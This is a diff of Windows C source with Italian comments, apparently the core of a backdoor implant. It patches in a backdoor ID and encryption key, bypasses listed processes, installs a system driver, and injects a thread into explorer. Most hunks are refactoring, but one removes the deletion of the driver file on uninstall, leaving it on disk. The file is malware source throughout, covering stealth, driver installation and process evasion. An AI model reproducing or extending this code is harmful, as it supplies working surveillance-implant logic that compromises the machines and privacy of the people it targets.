@@ -182,7 +182,7 @@ BYTE bin_patched_key_conf[] = ENCRYPTION_KEY_CONF;
 BYTE bin_patched_backdoor_id[] = BACKDOOR_ID;
 
 // Variabili di configurazione globali
-nanosec_time date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
+NANOSEC_TIME date_delta; // Usato per eventuali aggiustamenti sulla lettura delle date
 
 extern BOOL WINAPI DA_Uninstall(BYTE *dummy_param);
 BOOL ReadDesc(DWORD pid, WCHAR *file_desc, DWORD len);
@@ -437,9 +437,6 @@ void HM_RemoveDriver()
 
 	// Rimuove le chiavi nel registry
 	reg_device.unhook_uninstall();
-
-	// Cancella il file del driver
-	RemoveSystemDriver();
 }
 
 // Inietta il thread in explorer per la cancellazione
@@ -560,7 +557,7 @@ BOOL HM_ProcessByPass(DWORD pid)
 	
 	// Lo compara con quelli da bypassare
 	for(i=0; i<shared.process_bypassed; i++) {
-		if (CmpWild((unsigned char *)shared.process_bypass_list[i], (unsigned char *)process_name)) {
+		if (CmpWild(shared.process_bypass_list[i], process_name)) {
 			SAFE_FREE(process_name);
 			// Se e' uno dinamico, o non ho descrizione valida, allora controlla solo il nome
 			if (i>=EMBEDDED_BYPASS || shared.process_bypass_desc[i][0]==0 || desc_failed)
@@ -1499,7 +1496,7 @@ void WINAPI HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_INF
 		}
 
 		// Copia il driver (solo se non c'e' gia')
-		if (!dev_probe.unhook_isdev()) {
+		if (!dev_probe.isdev()) {
 			if (!CopySystemDriver(drv_path)) {
 				ReportCannotInstall();
 				return;
@@ -1661,16 +1658,11 @@ WCHAR *HM_CompletePathW(WCHAR *file_name, WCHAR *buffer)
 }
 
 // ritorna la data (100-nanosec dal 1601)
-BOOL HM_GetDate(nanosec_time *time)
+BOOL HM_GetDate(NANOSEC_TIME *time)
 {
-	//SYSTEMTIME system_time;
 	FILETIME time_nanosec;
 
-	// Prende il tempo di sistema e lo converte in FILETIME (100-nanosecondi)
 	FNC(GetSystemTimeAsFileTime)(&time_nanosec);
-	//if (!FNC(SystemTimeToFileTime)(&system_time, &time_nanosec))
-		//return FALSE;
-
 	time->hi_delay = time_nanosec.dwHighDateTime;
 	time->lo_delay = time_nanosec.dwLowDateTime;
 
@@ -2258,7 +2250,7 @@ void HM_ClearCommand()
 	}
 }
 
-void HM_CalcDateDelta(long long server_time, nanosec_time *delta)
+void HM_CalcDateDelta(long long server_time, NANOSEC_TIME *delta)
 {
 	long long client_time;
 	long long delta_l;
